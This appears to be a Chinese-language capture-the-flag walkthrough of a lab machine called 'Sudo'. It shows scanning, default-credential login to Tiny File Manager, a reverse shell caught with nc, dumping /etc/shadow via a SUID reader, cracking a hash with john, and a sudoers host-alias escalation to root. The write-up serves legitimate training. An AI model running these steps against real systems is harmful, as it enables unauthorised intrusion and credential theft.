![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT
Nmap scan report for 192.168.205.175
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                       
```

看web

![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)

跳转不过去，拦一下jsdelivr的

![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)

跳转到

![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)

nuclei看看架构

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.175/tinyfilemanager.php

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.5

                projectdiscovery.io

[INF] Current nuclei version: v3.4.5 (outdated)
[INF] Current nuclei-templates version: v10.2.4 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 8150
[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 204 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1761 (Reduced 1653 Requests)
[INF] Using Interactsh Server: oast.pro
[cookies-without-httponly] [javascript] [info] 192.168.205.175 ["filemanager"]
[cookies-without-secure] [javascript] [info] 192.168.205.175 ["filemanager"]
[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22
[ssh-password-auth] [javascript] [info] 192.168.205.175:22
[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ["["publickey","password"]"]
[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[openssh-detect] [tcp] [info] 192.168.205.175:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php
[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ["Apache/2.4.62 (Debian)"]
[INF] Scan completed in 1m. 24 matches found.
                          
```

搜一下有没有洞

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ searchsploit tiny file manager
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ searchsploit -m php/webapps/50828.sh
  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50828
     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
    Codes: CVE-2021-45010, CVE-2021-40964
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /mnt/hgfs/gx/x/tmp/50828.sh


                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh

TIny File Manager Authenticated RCE Exploit.

By FEBIN

/mnt/hgfs/gx/x/tmp/50828.sh <URL> <Admin Username> <Password>

Example: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin "admin@123"

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin "admin@123"
/usr/bin/curl
[✔] Curl found! 
/usr/bin/jq
[✔] jq found! 

[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d 
jq: parse error: Invalid numeric literal at line 1, column 14
[-] Can't find WEBROOT! Using default /var/www/html 
[-] File Upload Unsuccessful! Exiting! 
                                           
```

失败，但是默认密码登录成功了，所以我们去web自己上传

![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)

成了，什么现在都没有，直接访问，拿shell（这个架构。群主好像打过）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lnvp 8888                                       
listening on [any] 8888 ...

```

![image-20250711175447900](https://7r1umphk.github.io/image/20250711175448104.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lnvp 8888                                       
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.175] 55696
Linux Sudo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 05:54:36 up 12 min,  0 users,  load average: 0.40, 4.74, 3.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (414): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Sudo:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Sudo:/$ cd /h
cd /home/
www-data@Sudo:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  9 04:41 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwxr-xr-x  2 eecho eecho 4096 Jul  9 04:42 eecho
www-data@Sudo:/home$ cd ee
cd eecho/
www-data@Sudo:/home/eecho$ ls -al
ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -> /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
www-data@Sudo:/home/eecho$ su eecho
su eecho
Password: eecho
su: Authentication failure
www-data@Sudo:/home/eecho$ cat user.txt
cat user.txt
flag{user-e1930b4927e6b6d92d120c7c1bba3421}
www-data@Sudo:/home/eecho$ cd /opt 
cd /opt
www-data@Sudo:/opt$ ls -al
ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
www-data@Sudo:/opt$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/read_file
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

/usr/bin/read_file

```
www-data@Sudo:/opt$ ls -al /usr/bin/read_file
ls -al /usr/bin/read_file
-rwsr-sr-x 1 root root 17528 Jul  9 05:01 /usr/bin/read_file
www-data@Sudo:/opt$ strings /usr/bin/read_file
strings /usr/bin/read_file
/lib64/ld-linux-x86-64.so.2
4hhl
strncmp
perror
puts
printf
strlen
read
getopt
realpath
optarg
stderr
fwrite
close
open
__cxa_finalize
__libc_start_main
__xstat
__lxstat
libc.so.6
GLIBC_2.3
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
hu)H
[]A\A]A^A_
Usage: %s -f <filepath>
Options:
  -h         Show this help message
  -f <file>  Specify the file to view (must be under /etc)
Security restrictions:
  - File path must start with /etc/
  - Symbolic links and path traversal are blocked
  - Only regular files can be read
/etc/
Error: No arguments provided
Error: No file specified
Error: Path must start with /etc/
Error resolving path
Error: Resolved path is not under /etc/
Error checking file status
Error: Symbolic links are not allowed
Error checking resolved file
Error: Only regular files are allowed
Error opening file
Error reading file
Error writing to stdout
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
read_file.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
__stat
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
strlen@GLIBC_2.2.5
__lxstat@GLIBC_2.2.5
printf@GLIBC_2.2.5
close@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
is_etc_directory
optarg@GLIBC_2.2.5
__gmon_start__
__dso_handle
realpath@GLIBC_2.3
_IO_stdin_used
__xstat@GLIBC_2.2.5
__libc_csu_init
__bss_start
main
__lstat
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
getopt@GLIBC_2.2.5
print_help
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
stderr@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

还要帮助文档，不错不错

```
www-data@Sudo:/opt$ /usr/bin/read_file -f /etc/shadow
/usr/bin/read_file -f /etc/shadow
root:$y$j9T$8u7tw.ivXZkGdXyV0Fs.d/$FfzoOYYu8sRq7K2smsiRh5UGsVU2mI8.Q3Vmk0VtzUA:20190:0:99999:7:::
daemon:*:20166:0:99999:7:::
bin:*:20166:0:99999:7:::
sys:*:20166:0:99999:7:::
sync:*:20166:0:99999:7:::
games:*:20166:0:99999:7:::
man:*:20166:0:99999:7:::
lp:*:20166:0:99999:7:::
mail:*:20166:0:99999:7:::
news:*:20166:0:99999:7:::
uucp:*:20166:0:99999:7:::
proxy:*:20166:0:99999:7:::
www-data:*:20166:0:99999:7:::
backup:*:20166:0:99999:7:::
list:*:20166:0:99999:7:::
irc:*:20166:0:99999:7:::
gnats:*:20166:0:99999:7:::
nobody:*:20166:0:99999:7:::
_apt:*:20166:0:99999:7:::
systemd-timesync:*:20166:0:99999:7:::
systemd-network:*:20166:0:99999:7:::
systemd-resolve:*:20166:0:99999:7:::
systemd-coredump:!!:20166::::::
messagebus:*:20166:0:99999:7:::
sshd:*:20166:0:99999:7:::
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.:20278:0:99999:7:::
```

爆出了一个eecho

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis15         (eecho)     
1g 0:00:00:01 DONE (2025-07-11 06:00) 0.5263g/s 26947p/s 26947c/s 26947C/s truckin..choccy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat hash
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.
             
```

登录

```
www-data@Sudo:/opt$ su eecho
su eecho
Password: alexis15
id
uid=1000(eecho) gid=1000(eecho) groups=1000(eecho)
echo $0
bash
```

稳固

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

看看有没有信息

```
eecho@Sudo:~$ ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -> /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
eecho@Sudo:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for eecho: 
Sorry, user eecho may not run sudo on Sudo.
```

啊这，我还以为出sudo题呢，不是那就是read那个有问题
居然靶机叫sudo，不是sudo -l，那会不会是/etc/sudoers有问题

看看

```
eecho@Sudo:~$ /usr/bin/read_file -f /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
eecho Dashazi = NOPASSWD:ALL
# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
```

还真是

它需要Dashazi的主机别名才生效

```
eecho@Sudo:~$ hostname
Sudo
eecho@Sudo:~$ sudo -h Dashazi /bin/bash
sudo: unable to resolve host Dashazi: Name or service not known
root@Sudo:/home/eecho# id
uid=0(root) gid=0(root) groups=0(root)
root@Sudo:/home/eecho# cat /root/root.txt 
flag{root}
```

